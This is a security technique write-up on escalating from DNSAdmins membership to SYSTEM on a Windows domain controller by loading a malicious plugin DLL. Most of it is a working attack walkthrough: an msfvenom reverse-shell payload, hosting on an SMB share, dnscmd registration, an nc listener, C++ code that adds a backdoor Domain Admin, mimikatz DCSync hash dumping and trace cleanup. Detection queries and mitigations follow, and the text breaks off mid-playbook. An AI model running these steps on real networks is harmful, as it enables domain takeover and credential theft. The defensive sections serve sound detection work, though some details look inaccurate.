# [PE-VALID-003]: Unfiltered DNSAdmins Access

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-003 |
| **MITRE ATT&CK v18.1** | [T1078.002 - Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/) |
| **Tactic** | Privilege Escalation, Lateral Movement |
| **Platforms** | Windows AD (Any domain with DNS on DC) |
| **Severity** | **CRITICAL** |
| **CVE** | CVE-2021-40469 (related), No specific CVE for misconfig |
| **Technique Status** | ACTIVE (Mitigation available but not default) |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2008 R2 - 2022 (All versions vulnerable if misconfigured) |
| **Patched In** | N/A (Configuration issue, not a bug) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** The DNSAdmins group is a privileged security group that provides administrative rights over DNS services. By design, members of DNSAdmins can load arbitrary Dynamic Link Libraries (DLLs) into the DNS service process (`dns.exe`) using the `dnscmd.exe` utility. Since DNS services typically run on Domain Controllers as **NT AUTHORITY\SYSTEM**, an attacker who is a member of DNSAdmins (or can add themselves to the group) can load a malicious DLL that executes arbitrary code with **Domain Admin equivalent privileges**.

**Attack Surface:** DNSAdmins group membership, `dnscmd.exe` utility, DNS service process, DLL injection mechanism via `ServerLevelPluginDll` registry value.

**Business Impact:** **Full domain compromise via code execution as SYSTEM on Domain Controllers.** An attacker with DNSAdmins access can immediately execute arbitrary commands with the highest privilege level, modify Active Directory, create backdoor accounts, or establish persistent access.

**Technical Context:** This attack takes approximately 5-10 minutes to execute from DNSAdmins group membership to Domain Admin privileges. It generates detectable audit trail (DLL loading, registry modification, service restart) but is often missed if SOC is not monitoring DNS service behavior. The attack is **not easily reversible** without restoring the system from backup.

### Operational Risk
- **Execution Risk:** **Low** - Requires only DNSAdmins group membership; no additional privilege escalation needed.
- **Stealth:** **Medium** - Service restart and DLL loading create observable events; reversible if DNS service is quickly restored.
- **Reversibility:** **Partial** - DNS service can be restarted cleanly if DLL is removed, but SYSTEM-level code execution already occurred.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.4.1, 5.5.1 | DNS server configuration; role-based access control |
| **DISA STIG** | V-220939, V-220950 | Restrict DNS administration; audit DNS service access |
| **CISA SCuBA** | AC-2, AC-6 | Account and Access Management; Least Privilege |
| **NIST 800-53** | AC-6, SI-7 | Least Privilege; Software, Firmware, and Information Integrity |
| **GDPR** | Art. 32 | Security of Processing (access control, integrity) |
| **DORA** | Art. 18 | ICT-related incident management |
| **NIS2** | Art. 21 | Cyber risk management (privileged access) |
| **ISO 27001** | A.9.2.3, A.12.5.1 | Management of Privileged Access; Control of Operational Software |
| **ISO 27005** | Section 8.2 | Risk treatment options (mitigation) |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- Membership in **DNSAdmins** group (or ability to add self to the group via ACL abuse).
- Alternatively, read/write access to `CN=MicrosoftDNS,CN=System` container (in some configurations).

**Required Access:**
- RPC (Remote Procedure Call) access to Domain Controller hosting DNS service (typically port 135, 49152-65535).
- Network access to a file share accessible by the DC (for DLL hosting).
- Ability to execute `dnscmd.exe` or equivalent LDAP operations.

**Supported Versions:**
- **Windows:** Server 2008 R2 - 2012 R2 - 2016 - 2019 - 2022
- **DNS Service:** Any version of Windows DNS (built-in feature)
- **Other Requirements:**
  - DNS role must be installed on the Domain Controller (if not installed, attack is not possible).
  - DNS service must be running.
  - No AdminSDHolder protection on DNSAdmins group (default configuration).

**Tools:**
- [dnscmd.exe](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc775702(v=ws.10)) (Built-in Windows utility)
- [Msfvenom](https://github.com/rapid7/metasploit-framework) (DLL payload generation)
- [C++ compiler](https://github.com/kazkansouh/DNSAdmin-DLL) (Custom DLL development)
- [PowerShell](https://learn.microsoft.com/en-us/powershell/) (Group membership verification)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Step 1: Verify DNSAdmins Group Exists and Current Membership

**Objective:** Confirm that the DNSAdmins group exists in the domain and identify members.

**PowerShell Command:**
```powershell
# Check if DNSAdmins group exists
Get-ADGroup -Identity "DnsAdmins" -ErrorAction SilentlyContinue

# If group exists, list all members
Get-ADGroupMember -Identity "DnsAdmins" -Recursive | 
  Select-Object Name, SamAccountName, ObjectClass

# Check if current user is in DNSAdmins
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object System.Security.Principal.WindowsPrincipal($currentUser)
$principal.IsInRole("DnsAdmins")

# Expected output (if user is member):
# True
```

**What to Look For:**
- If `Get-ADGroup` returns an error, DNS role was never installed (attack not possible).
- If group exists but is empty, no current exploitation path (unless ACL abuse possible).
- If current user is in group, exploitation is immediately possible.
- If other users are members, those accounts are also vulnerable.

**Expected Output (Success):**
```
DistinguishedName : CN=DnsAdmins,CN=Users,DC=domain,DC=local
ObjectClass : group
Name : DnsAdmins
SamAccountName : DnsAdmins

GroupMember Results:
Name                 SamAccountName   ObjectClass
----                 -----------      -----------
Domain User 1        user1            user
DNS Server Admin     dnsadmin         user
DC01$                DC01$            computer
```

---

### Step 2: Verify DNS Service is Running on Domain Controllers

**Objective:** Confirm that the DNS service is active on at least one Domain Controller.

**PowerShell Command:**
```powershell
# Get all Domain Controllers
$dcs = Get-ADDomainController -Filter * | Select-Object -ExpandProperty Name

# Check DNS service status on each DC
foreach ($dc in $dcs) {
    $service = Get-Service -ComputerName $dc -Name DNS -ErrorAction SilentlyContinue
    if ($service) {
        Write-Host "DC: $dc - DNS Service Status: $($service.Status)"
    } else {
        Write-Host "DC: $dc - DNS Service NOT INSTALLED"
    }
}

# Expected output:
# DC: DC01 - DNS Service Status: Running
# DC: DC02 - DNS Service Status: Running
```

**What to Look For:**
- At least one DC with DNS service in "Running" status.
- If all DCs show "NOT INSTALLED", attack cannot proceed (DNS role required).
- If service is "Stopped", it can be started if user has privileges.

---

### Step 3: Identify DNS Servers and Registry Path

**Objective:** Locate the registry path where malicious DLL will be injected (`ServerLevelPluginDll`).

**PowerShell Command (on DC or remote via RPC):**
```powershell
# Query registry for DNS plugin DLL path
$dcName = "DC01"
$regPath = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters"

# Option 1: Query local DC registry (if running on DC)
$regKey = Get-ItemProperty -Path "Registry::$regPath" -ErrorAction SilentlyContinue

# Option 2: Query remote DC via WMI/PSRemoting
$session = New-PSSession -ComputerName $dcName -Credential $cred
Invoke-Command -Session $session -ScriptBlock {
    Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters"
}

# Expected output:
# ServerLevelPluginDll : (empty if not yet configured)
```

**What to Look For:**
- If `ServerLevelPluginDll` is empty: Attack can inject a DLL here.
- If `ServerLevelPluginDll` already has a value: Check if it's legitimate or suspicious.
- Registry path exists: DNS service is properly configured.

---

### Step 4: Verify RPC Access to Domain Controller

**Objective:** Ensure RPC connectivity to the target DC (required for `dnscmd.exe` operations).

**PowerShell Command:**
```powershell
# Test RPC connectivity to DC
$dc = "DC01.domain.local"

# Option 1: Via Test-NetConnection (Port 135 is RPC Endpoint Mapper)
Test-NetConnection -ComputerName $dc -Port 135

# Option 2: Via dnscmd test (will also verify DNS connectivity)
dnscmd $dc /info

# Expected output (success):
# ComputerName     : DC01.domain.local
# RemoteAddress    : 192.168.1.10
# RemotePort       : 135
# TcpTestSucceeded : True
```

**What to Look For:**
- `TcpTestSucceeded : True` indicates RPC is accessible.
- If connection fails, firewall may be blocking RPC (port 135).
- If `dnscmd` shows DNS info, both RPC and DNS are accessible.

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: DLL Injection via dnscmd.exe (Msfvenom Payload)

**Supported Versions:** Windows Server 2008 R2 - 2022

**Preconditions:**
- Attacker is member of DNSAdmins group (or can add self via ACL abuse).
- RPC access to target Domain Controller.
- File share accessible by the DC (to host malicious DLL).
- Ability to restart DNS service (optional but recommended for clean execution).

---

#### Step 1: Generate Malicious DLL Payload

**Objective:** Create a DLL that will be loaded by the DNS service and execute arbitrary code as SYSTEM.

**Command (on Linux/attacker machine):**
```bash
# Generate 64-bit reverse shell DLL using Msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 \
  --platform=windows -f dll > payload.dll

# Alternative: Generate for x86 (if target is 32-bit)
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 \
  --platform=windows -f dll > payload_x86.dll

# For stable execution without service crash, use custom DLL with DnsPluginInitialize export
# (See references for custom DLL code that properly implements DNS plugin format)

# Expected output:
# [-] No platform was specified, choosing Msf::Module::Platform::Windows from the payload
# [-] No arch selected, suitable for both x86 and x64 (using x64)
# [-] No encoder specified, output is raw payload
# [-] Payload size: 333 bytes
```

**What This Means:**
- Msfvenom has generated a malicious DLL (`payload.dll`).
- This DLL, when loaded by `dns.exe`, will establish a reverse shell to the attacker's IP:port.
- The DLL will execute as **NT AUTHORITY\SYSTEM** (the privilege level of the DNS service).

**OpSec & Evasion:**
- Msfvenom payloads are signature-detected by most AV products.
- Use custom C++ DLL if possible (see references for custom implementation).
- Custom DLLs with proper DNS plugin exports are more stealthy (service won't crash).

---

#### Step 2: Host DLL on Accessible File Share

**Objective:** Upload the malicious DLL to a UNC path accessible by the Domain Controller.

**Command (on attacker machine or internal compromised server):**
```bash
# Option 1: Host on SMB share accessible to DC
# Copy payload.dll to shared folder
cp payload.dll /mnt/shared_folder/payload.dll

# Option 2: Create impromptu SMB share (if root/admin access)
# On Linux with Impacket smbserver
python3 -m impacket.smbserver -smb2support Share /tmp/share_folder

# Expected SMB path (UNC):
# \\192.168.1.100\Share\payload.dll
# or
# \\attacker.domain.local\Share\payload.dll

# Verify accessibility from DC
# (Can be tested after establishing RPC connection)
```

**What This Means:**
- The DLL is now hosted on a network share that the DC can access via SMB.
- The DC can download and execute the DLL when directed to via `dnscmd`.
- UNC path must be resolvable and accessible from the DC.

**Troubleshooting:**
- **Error: "Access Denied" when accessing share**
  - Cause: DC cannot authenticate to the share or share permissions are restrictive.
  - Fix: Ensure the share allows Read access for the DC computer account or Everyone.

- **Error: "File not found on UNC path"**
  - Cause: DNS service cannot resolve the hostname or path is incorrect.
  - Fix: Use IP address instead of hostname (e.g., `\\192.168.1.100\Share` instead of `\\attacker\Share`).

---

#### Step 3: Use dnscmd.exe to Register DLL with DNS Service

**Objective:** Configure the DNS service to load the malicious DLL on next service restart.

**Command (from DNSAdmins member account):**
```powershell
# Target Domain Controller
$dc = "DC01.domain.local"

# Register malicious DLL with DNS service
dnscmd.exe $dc /config /serverlevelplugindll \\192.168.1.100\Share\payload.dll

# Expected output:
# Command completed successfully.
# 
# Registry value ServerLevelPluginDll successfully set to \\192.168.1.100\Share\payload.dll

# Verify the setting was applied
dnscmd.exe $dc /info

# Check registry directly (if on DC or via remote registry)
# HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll
# Should now contain: \\192.168.1.100\Share\payload.dll
```

**What This Means:**
- The DNS service configuration has been updated to load `payload.dll` at startup.
- The registry value `ServerLevelPluginDll` now points to the malicious DLL path.
- The DLL will NOT be loaded until the DNS service restarts.

**OpSec & Evasion:**
- Event ID 5136 (Directory Service Object Modified) may be logged if registry auditing is enabled.
- Event: Registry modification in `HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters`.
- Detection likelihood: **High** if SOC is monitoring DNS service registry changes.

---

#### Step 4: Restart DNS Service to Trigger DLL Loading

**Objective:** Stop and restart the DNS service to force it to load the malicious DLL.

**Command (from DNSAdmins member account):**
```powershell
# Option 1: Using sc.exe (Service Control)
$dc = "DC01.domain.local"

# Stop DNS service
sc.exe \\$dc stop dns

# Wait 2-3 seconds
Start-Sleep -Seconds 3

# Start DNS service (this will load the malicious DLL)
sc.exe \\$dc start dns

# Expected output:
# [SC] SendServiceControlEx: OpenService FAILED [DC01.domain.local]
# Or if successful:
# SERVICE_NAME: DNS
#     TYPE : 10 WIN32_OWN_PROCESS
#     STATE : 2 START_PENDING
#     WIN32_EXIT_CODE : 0 (0x0)
#     SERVICE_EXIT_CODE : 0 (0x0)
#     CHECKPOINT : 0
#     WAIT_HINT : 30000ms

# Option 2: Check if service started and DLL was loaded
Get-Service -ComputerName $dc -Name DNS | Select-Object Status

# Check DNS service events for errors
Get-EventLog -ComputerName $dc -LogName System -Source DNS | 
  Select-Object -First 10 TimeGenerated, EventID, Message
```

**What This Means:**
- If the DLL has proper DNS plugin exports (DnsPluginInitialize function), it will load cleanly.
- If the DLL is a standard reverse shell (like Msfvenom), the DNS service may **crash** after executing the payload (service will have short runtime).
- A reverse shell connection should be established to the attacker's listener during or shortly after DNS service startup.

**Troubleshooting:**
- **Error: "Access Denied"**
  - Cause: User does not have permission to restart DNS service on DC.
  - Fix: Must be member of DNSAdmins AND have "Start/Stop" permission on DNS service (not always default).
  - Alternative: Use custom DLL that starts payload in separate thread (prevents service crash).

- **Error: "File not found" (DLL loading fails)**
  - Cause: UNC path unreachable from DC, or DLL format incompatible.
  - Fix: Verify DNS service can access share; use custom DLL with proper exports.

- **No reverse shell connection**
  - Cause: Firewall blocking outbound connection from DC to attacker IP:port.
  - Fix: Verify network connectivity; use callback to attacker-controlled domain or internal system.

---

#### Step 5: Catch Reverse Shell and Execute Commands as SYSTEM

**Objective:** Receive the reverse shell connection and verify code execution as SYSTEM.

**Command (on attacker machine):**
```bash
# Set up netcat listener on port 4444
nc -lvnp 4444

# Expected connection:
# listening on [any] 4444 ...
# connect to [192.168.1.100] from [192.168.1.10] [random_port]
# 
# Microsoft Windows [Version 10.0.19044]
# (c) Microsoft Corporation. All rights reserved.
#
# C:\Windows\system32> whoami
# nt authority\system
#
# C:\Windows\system32> hostname
# DC01
```

**Verify SYSTEM Privileges:**
```powershell
# Once in the shell, verify privilege level
whoami
# Output: nt authority\system

# List privileges
whoami /priv
# Should show: SeImpersonatePrivilege, SeCreateTokenPrivilege (SYSTEM-level)

# Verify DC hostname
hostname
# Output: DC01

# Verify this is actually a Domain Controller
net group "Domain Admins" /domain
# Output: Lists all Domain Admins
```

**What This Means:**
- Code execution has been achieved as SYSTEM on the Domain Controller.
- The attacker now has Domain Admin equivalent privileges.
- All Domain Admin operations are now possible (create users, dump hashes, modify GPOs, etc.).

---

#### Step 6: Establish Persistence and Clean Up

**Objective:** Create backdoor access and clean up traces of exploitation.

**Commands (in SYSTEM shell):**
```powershell
# Option 1: Create backdoor local admin user
net user backdoor P@ssw0rd123 /add
net localgroup administrators backdoor /add

# Option 2: Create Domain Admin user (requires Domain Admin context)
# (This command will work because we're running as SYSTEM on DC)
net user attacker_da P@ssw0rd123 /add /domain
net group "Domain Admins" attacker_da /add /domain

# Option 3: Dump all domain password hashes via DCSync
# Use Mimikatz or similar (can be run from SYSTEM shell)
mimikatz.exe "lsadump::dcsync /domain:domain.local /all /csv" exit

# Cleanup: Remove the ServerLevelPluginDll registry entry
reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters" /v ServerLevelPluginDll /f

# Restart DNS service to resume normal operation
net stop dns
net start dns

# Expected output:
# The DNS service has been started.
```

**What This Means:**
- Persistent backdoor access has been established.
- Cleanup removes evidence of DLL injection (registry entry deleted).
- DNS service returns to normal operation (though credential-based backdoor remains).

---

### METHOD 2: ACL Abuse to Add Self to DNSAdmins (Pre-exploitation)

**Supported Versions:** Windows Server 2008 R2 - 2022

**Preconditions:**
- User is member of Exchange Windows Permissions group (or similar group with WriteDACL on DNSAdmins).
- Or: User has GenericWrite permission on DNSAdmins group object.

---

#### Step 1: Verify Current User's Permissions on DNSAdmins Group

**Objective:** Check if the current user can modify the DNSAdmins group ACL.

**PowerShell Command:**
```powershell
# Get the DNSAdmins group ACL
$dnsAdminGroup = Get-ADGroup -Identity "DnsAdmins"
$acl = Get-Acl -Path "AD:\$($dnsAdminGroup.DistinguishedName)"

# Check for GenericWrite or AddMember permissions
$acl.Access | Where-Object { 
    $_.IdentityReference -match $env:USERNAME -or 
    $_.IdentityReference -match "Exchange Windows Permissions" -or
    $_.ActiveDirectoryRights -match "GenericWrite|WriteProperty"
} | Select-Object IdentityReference, ActiveDirectoryRights, AccessControlType

# Expected output (if vulnerable):
# IdentityReference                    ActiveDirectoryRights AccessControlType
# -----------------                    --------------------- ----------------
# DOMAIN\user                          GenericWrite          Allow
# DOMAIN\Exchange Windows Permissions WriteDacl             Allow
```

**What to Look For:**
- If output shows GenericWrite or WriteProperty: User can modify the group.
- If output is empty: User cannot modify DNSAdmins; proceed to direct DLL injection if already member.

---

#### Step 2: Add Current User to DNSAdmins Group

**Objective:** Use ACL permissions to add self to DNSAdmins group.

**PowerShell Command:**
```powershell
# Method 1: Direct group addition (if user has permission)
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$userObj = Get-ADUser -Identity $currentUser.User

Add-ADGroupMember -Identity "DnsAdmins" -Members $userObj

# Expected output:
# (No error = successful addition)

# Method 2: Via ACL modification (if GenericWrite permission)
$dnsAdminGroup = Get-ADGroup -Identity "DnsAdmins"
$groupDN = $dnsAdminGroup.DistinguishedName
$acl = Get-Acl -Path "AD:\$groupDN"

# Verify membership was added
Get-ADGroupMember -Identity "DnsAdmins" | Where-Object { $_.Name -match $currentUser.Name }

# Expected output:
# Name                        SamAccountName    ObjectClass
# ----                        ---------------   -----------
# attacker_user               attacker_user     user

# Important: Refresh group membership in token (requires logout/login or token elevation)
# For immediate use, use runas or create new process with updated token
```

**What This Means:**
- Current user is now a member of the DNSAdmins group.
- Group membership is in Active Directory; may not be reflected in current session token until re-login.
- User can now proceed with DLL injection (Steps 1-6 from METHOD 1).

**OpSec & Evasion:**
- Event ID 4732 (Member added to group) logged.
- Event ID 5136 (Group object modified) may also be logged.
- High visibility if SOC monitors DNSAdmins group membership changes.

---

### METHOD 3: Custom DNS Plugin DLL (Stealth Approach)

**Supported Versions:** Windows Server 2008 R2 - 2022

**Preconditions:**
- C++ compiler and DNS plugin development knowledge.
- DNSAdmins membership or ACL abuse capability.

---

#### Step 1: Develop Custom DNS Plugin DLL with Proper Exports

**Objective:** Create a DLL that implements the DNS plugin interface correctly, preventing service crash.

**C++ Code (example from references):**
```cpp
#include <windows.h>
#include <dns.h>

// DNS Plugin Interface (required exports)
extern "C" __declspec(dllexport) DWORD APIENTRY DnsPluginInitialize(
    PVOID pDnsServerContext,
    PVOID pDnsFilterContext
) {
    // Execute malicious code in separate thread to prevent service crash
    HANDLE hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)MaliciousCode,
        NULL,
        0,
        NULL
    );
    
    if (hThread) CloseHandle(hThread);
    
    return DNS_PLUGIN_STATUS_SUCCESS;
}

extern "C" __declspec(dllexport) DWORD APIENTRY DnsPluginCleanup() {
    return DNS_PLUGIN_STATUS_SUCCESS;
}

DWORD WINAPI MaliciousCode(LPVOID param) {
    // Execute payload here (reverse shell, add domain admin, etc.)
    // Example: Execute a command
    system("cmd.exe /c net user backdoor P@ssw0rd /add /domain");
    
    // Or: Add to Domain Admins
    system("cmd.exe /c net group \"Domain Admins\" backdoor /add /domain");
    
    return 0;
}
```

**Compilation:**
```bash
# Compile with Visual Studio or MinGW
cl.exe /LD /D_DEBUG payload.cpp dns.lib /link /DLL

# Or with MinGW:
# x86_64-w64-mingw32-g++ -shared -fPIC payload.cpp -o payload.dll
```

**What This Means:**
- Custom DLL properly implements the DNS plugin interface.
- Code executes in separate thread (DNS service won't crash).
- Malicious payload (e.g., add Domain Admin user) executes as SYSTEM.
- Service continues running normally (more stealthy).

---

#### Step 2: Register and Execute (Same as METHOD 1 Steps 3-6)

**Objective:** Register and execute the custom DLL using dnscmd.exe.

**Commands:**
```powershell
# Register DLL
dnscmd.exe DC01.domain.local /config /serverlevelplugindll \\attacker\Share\payload.dll

# Restart DNS service
sc.exe \\DC01.domain.local stop dns
Start-Sleep -Seconds 3
sc.exe \\DC01.domain.local start dns

# Verify DNS service is running (not crashed)
Get-Service -ComputerName DC01 -Name DNS | Select-Object Status
# Output: Running (if custom DLL executed cleanly)
```

**What This Means:**
- Custom DLL has executed successfully.
- DNS service remains running (indicates proper thread implementation).
- Malicious payload (e.g., adding Domain Admin user) has been executed.
- More stealthy than Msfvenom payload (service doesn't crash).

---

## 8. TOOLS & COMMANDS REFERENCE

### [dnscmd.exe](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc775702(v=ws.10))

**Version:** Built-in to Windows Server  
**Supported Platforms:** Windows (Server 2003+)

**Installation:**
- Built-in to Windows Server installations with DNS role installed.
- On Windows workstations without DNS tools: Install "DNS Server Tools" via RSAT.

**Usage:**
```powershell
# Query DNS info
dnscmd.exe DC01 /info

# Register malicious DLL
dnscmd.exe DC01 /config /serverlevelplugindll \\attacker\Share\payload.dll

# Clear/remove DLL registration
dnscmd.exe DC01 /config /serverlevelplugindll ""
```

---

### [Msfvenom](https://github.com/rapid7/metasploit-framework)

**Version:** Included with Metasploit Framework 6.0+  
**Supported Platforms:** Linux, MacOS, Windows

**Installation:**
```bash
# Install Metasploit
apt-get install metasploit-framework

# Or: Download from GitHub
git clone https://github.com/rapid7/metasploit-framework.git
```

**Usage:**
```bash
# Generate DLL reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 \
  --platform=windows -f dll > payload.dll
```

---

### [PowerShell Active Directory Module](https://learn.microsoft.com/en-us/powershell/module/activedirectory/)

**Usage:**
```powershell
# Get DNSAdmins members
Get-ADGroupMember -Identity "DnsAdmins" -Recursive

# Add user to group
Add-ADGroupMember -Identity "DnsAdmins" -Members $user

# Verify group membership
Get-ADGroupMember -Identity "DnsAdmins"
```

---

## 9. MICROSOFT SENTINEL DETECTION

### Sentinel Query 1: DNSAdmins Group Membership Changes

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Add member to group"
| where TargetResources[0].displayName == "DnsAdmins"
| project TimeGenerated, OperationName, InitiatedBy, TargetResources
```

---

### Sentinel Query 2: DNS Service Registry Modifications

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 13  // Registry value modified
| where RegistryKeyPath contains "DNS\\Parameters"
| where RegistryValueName == "ServerLevelPluginDll"
| project TimeGenerated, Computer, Account, RegistryValueData
```

---

### Sentinel Query 3: DNS Service Restart Events

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 7034  // Service crashed unexpectedly
| where ProcessName contains "dns.exe"
union (
    SecurityEvent
    | where EventID == 7035  // Service sent a Start/Stop request
    | where ProcessName contains "dns.exe"
)
| project TimeGenerated, Computer, ProcessName, EventID
```

---

## 10. WINDOWS EVENT LOG MONITORING

### Critical Event IDs

| Event ID | Source | Description | Severity |
|---|---|---|---|
| **4732** | Security | Member added to group | HIGH |
| **5136** | Security | Directory Service Object Modified | HIGH |
| **13** | Security | Registry value modified | MEDIUM |
| **7034** | System | Service crashed unexpectedly | HIGH |
| **7035** | System | Service sent a Start/Stop request | MEDIUM |

---

### Detection Rule: DNS Service Anomaly

```powershell
# Monitor for DNS service crashes or unexpected restarts
$dnsEvents = Get-WinEvent -FilterHashtable @{
    LogName = 'System'
    ProviderName = 'Service Control Manager'
    Id = 7034, 7035, 7036
    StartTime = (Get-Date).AddHours(-1)
}

foreach ($event in $dnsEvents) {
    if ($event.Id -eq 7034) {
        Write-Host "ALERT: DNS service crashed at $($event.TimeCreated)" -ForegroundColor Red
    }
}
```

---

## 11. SYSMON DETECTION

### Sysmon Rule: dnscmd.exe Execution

**Sysmon Event ID 1 (Process Creation):**
```xml
<Rule groupRelation="or">
    <ProcessCreate onmatch="all">
        <Image condition="ends with">dnscmd.exe</Image>
        <CommandLine condition="contains">/config /serverlevelplugindll</CommandLine>
    </ProcessCreate>
</Rule>
```

---

### Sysmon Rule: DNS Service Child Process

**Sysmon Event ID 1 (Process Creation):**
```xml
<Rule groupRelation="or">
    <ProcessCreate onmatch="all">
        <ParentImage condition="ends with">dns.exe</ParentImage>
        <CommandLine condition="contains any">
            cmd.exe; powershell.exe; rundll32.exe; wmic.exe
        </CommandLine>
    </ProcessCreate>
</Rule>
```

---

## 12. DEFENSIVE MITIGATIONS

### Mitigation 1: Add DNSAdmins to AdminSDHolder Protection

**Objective:** Prevent regular users from modifying the DNSAdmins group via ACL abuse.

**PowerShell:**
```powershell
# Add DNSAdmins to AdminSDHolder protected groups
$adminholder = Get-ADObject -Filter 'ObjectClass -eq "adminSDHolder"' -Properties ntSecurityDescriptor

$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    (Get-ADGroup -Identity "Domain Admins").SID,
    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
    [System.Security.AccessControl.AccessControlType]::Allow,
    [GUID]::Empty,
    [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
)

$adminholderACL = Get-Acl -Path "AD:\$($adminholder.DistinguishedName)"
$adminholderACL.AddAccessRule($ace)

# This requires running SDProp process (runs every 60 minutes by default)
# Or manually invoke: 
# $null = Invoke-ADSDPropHook
```

**Impact:**
- DNSAdmins group becomes protected like other critical groups.
- ACL abuse to modify DNSAdmins becomes difficult.
- Requires Domain Admin to add/remove members (least privilege principle).

---

### Mitigation 2: Remove DNSAdmins Group Members (If Not Needed)

**Objective:** Eliminate unnecessary memberships in DNSAdmins group.

**PowerShell:**
```powershell
# List all DNSAdmins members
Get-ADGroupMember -Identity "DnsAdmins" -Recursive | Select-Object Name, SamAccountName

# Remove unnecessary members
$userToRemove = Get-ADUser -Identity "username"
Remove-ADGroupMember -Identity "DnsAdmins" -Members $userToRemove -Confirm:$false

# Verify removal
Get-ADGroupMember -Identity "DnsAdmins"
```

**Impact:**
- Reduced attack surface (fewer users can execute DLL injection).
- Service account or dedicated admin should be only member (if DNS admin access is needed).

---

### Mitigation 3: Monitor and Alert on ServerLevelPluginDll Changes

**Objective:** Detect malicious DLL registration attempts.

**Registry Monitoring (via Group Policy Auditing):**
1. Enable audit on: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters`
2. Audit "Write" and "Delete" events.
3. Alert on any changes to `ServerLevelPluginDll` value.

**PowerShell Continuous Monitor:**
```powershell
# Periodically check for unexpected ServerLevelPluginDll values
$dnsPath = "HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters"
$pluginDll = (Get-ItemProperty -Path $dnsPath).ServerLevelPluginDll

if ($pluginDll -and $pluginDll -ne "") {
    Write-Warning "ALERT: Unexpected ServerLevelPluginDll value detected: $pluginDll"
    # Investigate and remove if malicious
    Remove-ItemProperty -Path $dnsPath -Name "ServerLevelPluginDll"
}
```

**Impact:**
- Early detection of malicious DLL injection attempts.
- Automatic remediation possible (remove malicious DLL registration).

---

### Mitigation 4: Restrict DNS Service Restart Permissions

**Objective:** Prevent non-admin users from restarting the DNS service.

**PowerShell (modify DNS service permissions):**
```powershell
# Configure DNS service to allow only Domain Admins to start/stop
$service = Get-Service -Name DNS
$acl = $service.ServiceHandle | Get-Acl

# Remove non-admin permissions (if any)
# Add Domain Admins with start/stop rights

# This is usually done via Group Policy for consistency
```

**Group Policy:**
1. Open **Group Policy Management** (gpmc.msc).
2. Edit **Default Domain Controller Policy**.
3. Navigate: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **System Services**.
4. Set **DNS** service: **Startup mode** = Automatic; **Permissions** = Administrators only.

**Impact:**
- DNSAdmins members cannot restart DNS service.
- DLL injection technique becomes unusable (service never restarts to load DLL).
- Requires local admin access to restart DNS (higher privilege barrier).

---

### Mitigation 5: Disable or Remove DNS Role (If Not Needed)

**Objective:** Eliminate DNS role from DCs if not required.

**PowerShell:**
```powershell
# Remove DNS role from Domain Controller
Uninstall-WindowsFeature -Name "DNS-Server" -Restart

# Verify removal
Get-WindowsFeature -Name "DNS-Server" | Select-Object InstallState
```

**Impact:**
- DNSAdmins exploitation becomes impossible (no DNS service to target).
- If DNS is required, consider centralizing on non-DC servers (more difficult to escalate to Domain Admin from isolated DNS servers).

---

### Mitigation 6: Implement Privileged Access Workstation (PAW) for DNS Admins

**Objective:** Restrict DNS administration to hardened, isolated machines.

**Implementation:**
- DNS admin accounts can only be used on PAW machines.
- PAW machines have restricted network access (cannot directly access other systems).
- MFA required for all PAW access.
- All admin actions on PAW logged and monitored.

**Impact:**
- Even if DNSAdmins credentials are compromised, attacker is restricted to PAW isolation.
- Reduces lateral movement and persistence capabilities.

---

## 14. DETECTION & INCIDENT RESPONSE

### Incident Response Playbook

**Step 1: Immediate Containment (First 15 minutes)**
```powershell
# 1. Identify which DC was compromised
Get-EventLog -LogName System -Source "Service Control Manager" -InstanceId 7034 | 
  Select-Object -First 1 ComputerName, TimeGenerated

# 2. Identify who modified ServerLevelPluginDll
Get-WinEvent -LogName Security -FilterHashtable @{ EventID = 13; RegistryValueName = "ServerLevelPluginDll" } |
  Select-Object TimeCreated, Properties[1], Properties[3]

# 3. Stop the DNS service and remove malicious DLL
$dc = "DC01"
Invoke-Command -ComputerName $dc -ScriptBlock {
    Stop-Service -Name DNS -Force
    $regPath = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters"
    Remove-ItemProperty -Path $regPath -Name "ServerLevelPluginDll"
    Start-Service -Name DNS
}

# 4. Reset all Domain Admin passwords
Get-ADGroupMember -Identity "Domain Admins" | ForEach-Object {
    $newPassword = [System.Web.Security.Membership]::GeneratePassword(16, 3)
